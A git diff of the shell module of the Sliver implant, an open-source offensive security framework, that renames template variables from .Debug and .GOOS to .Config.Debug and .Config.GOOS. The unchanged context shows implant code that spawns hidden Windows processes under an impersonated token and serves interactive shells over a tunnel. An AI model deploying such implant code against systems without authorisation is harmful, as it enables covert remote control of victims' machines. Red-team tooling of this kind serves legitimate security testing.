@@ -21,20 +21,20 @@ package shell
 import (
 	"io"
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
 	"os"
 	"os/exec"
 
-	// {{if ne .GOOS "windows"}}
+	// {{if ne .Config.GOOS "windows"}}
 	"runtime"
 
 	"github.com/bishopfox/sliver/sliver/shell/pty"
 	// {{end}}
 
-	// {{if eq .GOOS "windows"}}
+	// {{if eq .Config.GOOS "windows"}}
 	"syscall"
 
 	"github.com/bishopfox/sliver/sliver/priv"
@@ -57,7 +57,7 @@ type Shell struct {
 // Start - Start a process
 func Start(command string) error {
 	cmd := exec.Command(command)
-	//{{if eq .GOOS "windows"}}
+	//{{if eq .Config.GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token:      syscall.Token(priv.CurrentToken),
 		HideWindow: true,
@@ -69,7 +69,7 @@ func Start(command string) error {
 // StartInteractive - Start a shell
 func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {
 
-	// {{if ne .GOOS "windows"}}
+	// {{if ne .Config.GOOS "windows"}}
 	if enablePty && runtime.GOOS != "windows" {
 		return ptyShell(tunnelID, command)
 	}
@@ -79,13 +79,13 @@ func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell 
 }
 
 func pipedShell(tunnelID uint64, command []string) *Shell {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[shell] %s", command)
 	// {{end}}
 
 	var cmd *exec.Cmd
 	cmd = exec.Command(command[0], command[1:]...)
-	//{{if eq .GOOS "windows"}}
+	//{{if eq .Config.GOOS "windows"}}
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token:      syscall.Token(priv.CurrentToken),
 		HideWindow: true,
@@ -110,9 +110,9 @@ func (s *Shell) StartAndWait() {
 	s.Command.Wait()
 }
 
-// {{if ne .GOOS "windows"}}
+// {{if ne .Config.GOOS "windows"}}
 func ptyShell(tunnelID uint64, command []string) *Shell {
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("[ptmx] %s", command)
 	// {{end}}
 
@@ -120,7 +120,7 @@ func ptyShell(tunnelID uint64, command []string) *Shell {
 	cmd = exec.Command(command[0], command[1:]...)
 	ptmx, err := pty.Start(cmd)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[ptmx] %v, falling back to piped shell...", err)
 		// {{end}}
 		return pipedShell(tunnelID, command)
